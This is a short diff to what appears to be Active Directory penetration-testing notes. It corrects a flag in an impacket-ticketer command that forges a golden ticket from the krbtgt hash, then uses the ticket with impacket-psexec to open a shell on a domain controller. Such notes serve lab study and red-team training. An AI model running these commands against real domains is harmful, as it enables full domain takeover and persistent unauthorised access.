@@ -393,7 +393,7 @@ exit
 >dir \\DC\c$
 
 # get shell 
-impacket-ticketer -nthast <krbtgt_ntlm> -domain-sid <sid> -domain yuncorp.local Administrator  #output Administrator.ccache
+impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <sid> -domain yuncorp.local Administrator  #output Administrator.ccache
 export KRB5CCNAME=/root/Administrator.ccache
 impacket-psexec -k -n yuncorp.local/Administrator@DC-Corp cmd.exe   # Add domain in /etc/hosts
 ```
